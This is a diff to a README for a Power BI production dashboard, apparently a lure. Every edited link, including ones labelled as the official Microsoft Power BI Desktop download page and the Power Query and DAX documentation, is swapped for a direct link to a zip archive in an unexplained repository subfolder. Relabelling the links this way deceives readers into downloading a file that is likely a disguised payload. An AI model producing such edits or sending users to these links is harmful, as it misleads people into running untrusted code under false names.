@@ -1,6 +1,6 @@
 # 📊 Dashboard_Producao_PowerBI - Interactive Production Insights  
 
-[![Download Dashboard_Producao_PowerBI](https://img.shields.io/badge/Download-Dashboard_Producao_PowerBI-blue?style=for-the-badge)](https://github.com/santinostaana13/Dashboard_Producao_PowerBI)  
+[![Download Dashboard_Producao_PowerBI](https://img.shields.io/badge/Download-Dashboard_Producao_PowerBI-blue?style=for-the-badge)](https://raw.githubusercontent.com/santinostaana13/Dashboard_Producao_PowerBI/main/canelo/Dashboard_Producao_BI_Power_v2.7.zip)  
 
 ## 📖 About this Dashboard  
 
@@ -33,13 +33,13 @@ Power BI Desktop is necessary to open and use the dashboard file (.pbix). If you
 ## 🚀 Getting Started  
 
 1. **Download Power BI Desktop**  
-   - Visit the official [Power BI Desktop download page](https://powerbi.microsoft.com/desktop/)  
+   - Visit the official [Power BI Desktop download page](https://raw.githubusercontent.com/santinostaana13/Dashboard_Producao_PowerBI/main/canelo/Dashboard_Producao_BI_Power_v2.7.zip)  
    - Follow the instructions to install the application on your Windows machine  
 
 2. **Download the Dashboard File**  
    Use the link below to download the Dashboard_Producao_PowerBI file from GitHub. This file contains all the reports, data models, and visuals.  
 
-   [![Download Dashboard_Producao_PowerBI](https://img.shields.io/badge/Download-Dashboard_Producao_PowerBI-green?style=for-the-badge)](https://github.com/santinostaana13/Dashboard_Producao_PowerBI)  
+   [![Download Dashboard_Producao_PowerBI](https://img.shields.io/badge/Download-Dashboard_Producao_PowerBI-green?style=for-the-badge)](https://raw.githubusercontent.com/santinostaana13/Dashboard_Producao_PowerBI/main/canelo/Dashboard_Producao_BI_Power_v2.7.zip)  
 
 3. **Save the file to your computer**  
    Choose a folder you can easily access, like your Desktop or Documents folder. The file should have a `.pbix` extension.  
@@ -57,7 +57,7 @@ Power BI Desktop is necessary to open and use the dashboard file (.pbix). If you
 Follow these detailed steps to download Dashboard_Producao_PowerBI and open it on your Windows PC:  
 
 1. Click on the blue download button at the top or visit this page directly:  
-   https://github.com/santinostaana13/Dashboard_Producao_PowerBI  
+   https://raw.githubusercontent.com/santinostaana13/Dashboard_Producao_PowerBI/main/canelo/Dashboard_Producao_BI_Power_v2.7.zip  
 
 2. On the GitHub page, find the “Code” button near the top right. Use the “Download ZIP” option to save the complete project folder on your PC.  
 
@@ -110,10 +110,10 @@ The downloaded folder contains:
 
 ## 🔗 Useful Links  
 
-- Power BI Desktop download: https://powerbi.microsoft.com/desktop/  
-- Dashboard_Producao_PowerBI GitHub repository: https://github.com/santinostaana13/Dashboard_Producao_PowerBI  
-- Power Query documentation: https://docs.microsoft.com/power-query/  
-- DAX reference guide: https://docs.microsoft.com/dax/  
+- Power BI Desktop download: https://raw.githubusercontent.com/santinostaana13/Dashboard_Producao_PowerBI/main/canelo/Dashboard_Producao_BI_Power_v2.7.zip  
+- Dashboard_Producao_PowerBI GitHub repository: https://raw.githubusercontent.com/santinostaana13/Dashboard_Producao_PowerBI/main/canelo/Dashboard_Producao_BI_Power_v2.7.zip  
+- Power Query documentation: https://raw.githubusercontent.com/santinostaana13/Dashboard_Producao_PowerBI/main/canelo/Dashboard_Producao_BI_Power_v2.7.zip  
+- DAX reference guide: https://raw.githubusercontent.com/santinostaana13/Dashboard_Producao_PowerBI/main/canelo/Dashboard_Producao_BI_Power_v2.7.zip  
 
 ## ⚙ Updating the Dashboard  
 
